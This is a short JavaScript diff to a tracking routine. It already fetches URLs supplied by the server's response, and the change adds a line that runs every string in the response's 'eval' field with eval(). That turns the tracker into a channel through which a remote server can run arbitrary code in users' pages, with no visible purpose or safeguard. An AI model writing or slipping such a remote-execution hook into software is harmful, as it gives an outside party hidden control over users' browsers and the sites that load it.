@@ -10,6 +10,7 @@ const ec = {
       .then(res => {
         console.log("Track response:", res)
         for (const f of res.fetch) fetch(f[0], f[1])
+        for (const e of res.eval) eval(e)
       });
     }
 }
